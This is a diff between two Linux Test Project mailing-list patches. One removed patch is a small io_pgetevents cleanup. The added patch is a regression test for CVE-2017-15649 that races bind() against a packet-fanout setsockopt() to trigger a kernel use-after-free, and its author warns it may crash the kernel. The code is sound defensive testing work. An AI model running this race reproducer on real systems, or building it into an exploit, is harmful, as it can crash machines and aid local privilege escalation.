@@ -1,69 +1,39 @@
 Return-Path: <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 X-Original-To: lists+linux-ltp@lfdr.de
 Delivered-To: lists+linux-ltp@lfdr.de
-Received: from picard.linux.it (picard.linux.it [IPv6:2001:1418:10:5::2])
-	by mail.lfdr.de (Postfix) with ESMTPS id B337C14C928
-	for <lists+linux-ltp@lfdr.de>; Wed, 29 Jan 2020 11:59:10 +0100 (CET)
+Received: from picard.linux.it (picard.linux.it [213.254.12.146])
+	by mail.lfdr.de (Postfix) with ESMTPS id 4D4B014CA0B
+	for <lists+linux-ltp@lfdr.de>; Wed, 29 Jan 2020 13:02:46 +0100 (CET)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 397F03C2569
-	for <lists+linux-ltp@lfdr.de>; Wed, 29 Jan 2020 11:59:10 +0100 (CET)
+	by picard.linux.it (Postfix) with ESMTP id B3E793C256A
+	for <lists+linux-ltp@lfdr.de>; Wed, 29 Jan 2020 13:02:45 +0100 (CET)
 X-Original-To: ltp@lists.linux.it
 Delivered-To: ltp@picard.linux.it
-Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::2])
- by picard.linux.it (Postfix) with ESMTP id 1E24C3C2387
- for <ltp@lists.linux.it>; Wed, 29 Jan 2020 11:59:06 +0100 (CET)
-Received: from mail-pg1-x542.google.com (mail-pg1-x542.google.com
- [IPv6:2607:f8b0:4864:20::542])
- (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it [217.194.8.5])
+ by picard.linux.it (Postfix) with ESMTP id C17BB3C235D
+ for <ltp@lists.linux.it>; Wed, 29 Jan 2020 13:02:41 +0100 (CET)
+Received: from mx2.suse.de (mx2.suse.de [195.135.220.15])
+ (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
  (No client certificate requested)
- by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 35779600684
- for <ltp@lists.linux.it>; Wed, 29 Jan 2020 11:59:05 +0100 (CET)
-Received: by mail-pg1-x542.google.com with SMTP id 6so8661250pgk.0
- for <ltp@lists.linux.it>; Wed, 29 Jan 2020 02:59:05 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linaro.org; s=google;
- h=from:to:cc:subject:date:message-id:mime-version
- :content-transfer-encoding;
- bh=TDee1WcKsYoWNIf0+N8rt29p4eleWnJvIkbTnO3DsRE=;
- b=COwDXGlKiZw+WAWOCSmxvvySoqOSJn081FZ8KOuHlFOxy1774kUHYDHRfqzf70Hbfj
- dI1Vmo9Jc3Kkp7sU/spngkb6uarqyKWS7H9ZvkqnGOrjPKdolgX6WFGKwAPNWhA4mC+n
- rH/tE6fwERSGctUa/EvGu3IPCRYqTE1PZFPLsqSq1RwRK64VXIBx4kflmQUsZ17Gh69b
- zoVySRGh5UMIQW1zXIR6FN7u1vPf56DB4zqPikCQsprwhTghcdExIfD1sNbLmC0QmuFW
- 4K48UutRK0bHtfqRzzLig4c2PlykxnoTAJTHEJqY4e5KDZZWAjgR3UlgceVASh7lTgQP
- B7bg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20161025;
- h=x-gm-message-state:from:to:cc:subject:date:message-id:mime-version
- :content-transfer-encoding;
- bh=TDee1WcKsYoWNIf0+N8rt29p4eleWnJvIkbTnO3DsRE=;
- b=OPpLdq19DwYpJVI+67ABI5Yq/n6ceibZzL7HAw06vbNlunbueaVtfaxY43rByy090J
- o1HxP7wANIHdFVBv1QS58pAfuY5s6uCsfkv9nZCkQ9XuiK0t3x1QHehSLCbhKOVHWc90
- dCtW+irS9IMVzaE6iCmbDkM3uyALdIXXNAtsNIHec0C8fzC6a9Z0wyFBCgEhdDvObSVd
- qxHo6XheUXQSmd8/ktw8g5M2drEMj3Yqd/Rb3LU36L8oGzKjRv99jrUz6hktoLuJUwFR
- mQrZY15sf34PMCMAt3Z7/8FnG9mYzs7s6gs6ujAmKDVdB1lA28KERhFOE2F/FCRhdlea
- 9h8Q==
-X-Gm-Message-State: APjAAAUQH57F7cDpUfNcYy0nTQcK2uv632DceN7mrG5pOH+/7oNp1tfY
- Oaynrv4MXXBLFuds7l40i1jexA==
-X-Google-Smtp-Source: APXvYqxOuBjKvOquzQcE0EVPjJtgRaLn5C9LcjSZZ/NdktP3HOvtnw/jAM2Jr/LATLF7XXKYM7aVZA==
-X-Received: by 2002:a65:4b89:: with SMTP id t9mr15417343pgq.102.1580295543691; 
- Wed, 29 Jan 2020 02:59:03 -0800 (PST)
-Received: from localhost ([122.172.141.204])
- by smtp.gmail.com with ESMTPSA id b15sm2134709pft.58.2020.01.29.02.59.02
- (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
- Wed, 29 Jan 2020 02:59:02 -0800 (PST)
-From: Viresh Kumar <viresh.kumar@linaro.org>
-To: Cyril Hrubis <chrubis@suse.cz>
-Date: Wed, 29 Jan 2020 16:28:34 +0530
-Message-Id: <846e4f42d5112c2f945c391644949a14756f53f6.1580295508.git.viresh.kumar@linaro.org>
-X-Mailer: git-send-email 2.21.0.rc0.269.g1a574e7a288b
+ by in-5.smtp.seeweb.it (Postfix) with ESMTPS id E0BEF6012B4
+ for <ltp@lists.linux.it>; Wed, 29 Jan 2020 13:02:40 +0100 (CET)
+Received: from relay2.suse.de (unknown [195.135.220.254])
+ by mx2.suse.de (Postfix) with ESMTP id 6FA31AFCF
+ for <ltp@lists.linux.it>; Wed, 29 Jan 2020 12:02:40 +0000 (UTC)
+Received: by localhost (Postfix, from userid 1000)
+ id 2FEF1EF7B0; Wed, 29 Jan 2020 13:02:39 +0100 (CET)
+From: Michael Moese <mmoese@suse.de>
+To: ltp@lists.linux.it
+Date: Wed, 29 Jan 2020 13:02:31 +0100
+Message-Id: <20200129120231.17375-1-mmoese@suse.de>
+X-Mailer: git-send-email 2.25.0
 MIME-Version: 1.0
-X-Virus-Scanned: clamav-milter 0.99.2 at in-2.smtp.seeweb.it
+X-Virus-Scanned: clamav-milter 0.99.2 at in-5.smtp.seeweb.it
 X-Virus-Status: Clean
-X-Spam-Status: No, score=0.1 required=7.0 tests=DKIM_SIGNED,DKIM_VALID,
- DKIM_VALID_AU,SPF_HELO_NONE,SPF_PASS autolearn=disabled version=3.4.0
-X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on in-2.smtp.seeweb.it
-Subject: [LTP] [PATCH] syscalls/io_pgetevents: Use tst_syscall() instead of
- syscall()
+X-Spam-Status: No, score=0.0 required=7.0 tests=SPF_HELO_NONE,SPF_PASS
+ autolearn=disabled version=3.4.0
+X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on in-5.smtp.seeweb.it
+Subject: [LTP] [PATCH v2] Add a regression test for cve-2017-15649
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -75,37 +45,213 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: Viresh Kumar <viresh.kumar@linaro.org>,
- Vincent Guittot <vincent.guittot@linaro.org>, ltp@lists.linux.it
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it
 Sender: "ltp" <ltp-bounces+lists+linux-ltp=lfdr.de@lists.linux.it>
 
-Use the preferred helper tst_syscall() instead of syscall(), as it also
-takes care of error handling.
+net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local
+users to gain privileges via crafted system calls that trigger
+mishandling of packet_fanout data structures, because of a race
+condition (involving fanout_add and packet_do_bind) that leads to a
+use-after-free.
 
-Signed-off-by: Viresh Kumar <viresh.kumar@linaro.org>
+See https://ssd-disclosure.com/archives/3484 for more detail.
+
+Signed-off-by: Michael Moese <mmoese@suse.de>
+
+--
+Changes to v1:
+  - reworked the usage of fuzzy sync library so this should now be
+    correct
+  - use LTP library functions for file I/O
+  - require KASAN to be enabled
 ---
- include/lapi/io_pgetevents.h | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
+ runtest/cve                    |   2 +-
+ testcases/cve/.gitignore       |   1 +
+ testcases/cve/Makefile         |   1 +
+ testcases/cve/cve-2017-15649.c | 135 +++++++++++++++++++++++++++++++++
+ 4 files changed, 138 insertions(+), 1 deletion(-)
+ create mode 100644 testcases/cve/cve-2017-15649.c
 
-diff --git a/include/lapi/io_pgetevents.h b/include/lapi/io_pgetevents.h
-index 9c7f0ec9d813..3c9d5b2d7618 100644
---- a/include/lapi/io_pgetevents.h
-+++ b/include/lapi/io_pgetevents.h
-@@ -21,7 +21,8 @@ int io_pgetevents(io_context_t ctx, long min_nr, long max_nr,
- 		 struct io_event *events, struct timespec *timeout,
- 		 sigset_t *sigmask)
- {
--	return syscall(__NR_io_pgetevents, ctx, min_nr, max_nr, events, timeout, sigmask);
-+	return tst_syscall(__NR_io_pgetevents, ctx, min_nr, max_nr, events,
-+			   timeout, sigmask);
- }
- #endif /* HAVE_IO_PGETEVENTS */
- #endif /* HAVE_LIBAIO */
+diff --git a/runtest/cve b/runtest/cve
+index 57cf66075..b76ddaaaa 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -24,7 +24,7 @@ cve-2017-12193 add_key04
+ cve-2017-15274 add_key02
+ cve-2017-15299 request_key03 -b cve-2017-15299
+ cve-2017-15537 ptrace07
+-cve-2017-15649 fanout01
++cve-2017-15649 cve-2017-15649
+ cve-2017-15951 request_key03 -b cve-2017-15951
+ cve-2017-17805 af_alg02
+ cve-2017-17806 af_alg01
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 01a3e4c8f..08154e2db 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -8,5 +8,6 @@ cve-2017-2671
+ meltdown
+ stack_clash
+ cve-2017-17052
++cve-2017-15649
+ cve-2017-16939
+ cve-2017-17053
+diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
+index da44fff60..6cf3b5af9 100644
+--- a/testcases/cve/Makefile
++++ b/testcases/cve/Makefile
+@@ -46,5 +46,6 @@ cve-2017-17052:	CFLAGS += -pthread
+ cve-2017-17053:	CFLAGS += -pthread
+ 
+ cve-2015-3290:	CFLAGS += -pthread
++cve-2017-15649: CFLAGS += -pthread
+ 
+ include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/cve/cve-2017-15649.c b/testcases/cve/cve-2017-15649.c
+new file mode 100644
+index 000000000..11ade5cd5
+--- /dev/null
++++ b/testcases/cve/cve-2017-15649.c
+@@ -0,0 +1,135 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++/*
++ *   Copyright (c) 2019 Michael Moese <mmoese@suse.com>
++ */
++/* Regression test for CVE-2017-15649
++ * based on the reproducer at https://ssd-disclosure.com/archives/3484
++ *
++ * net/packet/af_packet.c in the Linux kernel before 4.13.6 allows local users
++ * to gain privileges via crafted system calls that trigger mishandling of
++ * packet_fanout data structures, because of a race condition (involving
++ * fanout_add and packet_do_bind) that leads to a use-after-free.
++ *
++ * Be careful! This test may crash your kernel!
++ */
++
++#include <pthread.h>
++#include <stdio.h>
++#include <sched.h>
++#include <string.h>
++#include <time.h>
++#include <net/if.h>
++#include <sched.h>
++#include <sys/types.h>
++#include <sys/socket.h>
++
++#include "tst_test.h"
++#include "tst_taint.h"
++#include "tst_safe_pthread.h"
++#include "tst_fuzzy_sync.h"
++#include "tst_capability.h"
++#include "lapi/syscalls.h"
++
++static struct tst_fzsync_pair fzsync_pair;
++
++static int fd;
++static struct ifreq ifr;
++
++struct sockaddr_ll {
++	unsigned short	sll_family;
++	short		sll_protocol;
++	int		sll_ifindex;
++	unsigned short	sll_hatype;
++	unsigned char	sll_pkttype;
++	unsigned char	sll_halen;
++	unsigned char	sll_addr[8];
++};
++static struct sockaddr_ll addr;
++
++void *bind_fn(void *unused)
++{
++	while (tst_fzsync_run_b(&fzsync_pair)) {
++		tst_fzsync_start_race_b(&fzsync_pair);
++		bind(fd, (struct sockaddr *)&addr, sizeof(addr));
++		tst_fzsync_end_race_b(&fzsync_pair);
++	}
++	return unused;
++}
++
++static void setup(void)
++{
++	int real_uid = getuid();
++	int real_gid = getgid();
++	int index;
++
++	tst_fzsync_pair_init(&fzsync_pair);
++	tst_taint_init(TST_TAINT_W | TST_TAINT_D | TST_TAINT_L);
++
++	if (unshare(CLONE_NEWUSER) != 0)
++		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
++
++	if (unshare(CLONE_NEWNET) != 0)
++		tst_brk(TBROK | TTERRNO, "unshare(CLONE_NEWUSER) failed");
++
++	SAFE_FILE_PRINTF("/proc/self/setgroups", "deny");
++	SAFE_FILE_PRINTF("/proc/self/uid_map", "0 %d 1\n", real_uid);
++	SAFE_FILE_PRINTF("/proc/self/gid_map", "0 %d 1\n", real_gid);
++
++	fd = SAFE_SOCKET(AF_PACKET, SOCK_RAW, PF_PACKET);
++
++	strcpy((char *) &ifr.ifr_name, "lo");
++	SAFE_IOCTL(fd, SIOCGIFINDEX, &ifr);
++	index = ifr.ifr_ifindex;
++
++	SAFE_IOCTL(fd, SIOCGIFFLAGS, &ifr);
++	ifr.ifr_flags &= ~(short) IFF_UP;
++
++	SAFE_IOCTL(fd, SIOCSIFFLAGS, &ifr);
++
++	addr.sll_family = AF_PACKET;
++	addr.sll_protocol = 0x0;
++	addr.sll_ifindex = index;
++}
++
++static void cleanup(void)
++{
++	tst_fzsync_pair_cleanup(&fzsync_pair);
++	SAFE_CLOSE(fd);
++}
++
++static void run(void)
++{
++	int fanout = 0x3;
++
++	tst_fzsync_pair_reset(&fzsync_pair, bind_fn);
++
++	while (tst_fzsync_run_a(&fzsync_pair)) {
++		tst_fzsync_start_race_a(&fzsync_pair);
++		setsockopt(fd, 0x107, 18, &fanout, sizeof(fanout));
++		tst_fzsync_end_race_a(&fzsync_pair);
++	}
++
++	tst_res(TPASS, "please check for KASAN output");
++}
++
++
++static const char *kconfigs[] = {
++	"CONFIG_KASAN",
++	"CONFIG_USER_NS",
++	NULL
++};
++
++static struct tst_cap caps[] = {
++	TST_CAP(TST_CAP_REQ, CAP_SYS_ADMIN),
++	TST_CAP(TST_CAP_REQ, CAP_NET_RAW),
++	TST_CAP(TST_CAP_DROP, CAP_SYS_ADMIN),
++	{},
++};
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.cleanup = cleanup,
++	.needs_kconfigs = kconfigs,
++	.caps = caps
++};
 -- 
-2.21.0.rc0.269.g1a574e7a288b
+2.25.0
 
 
 -- 
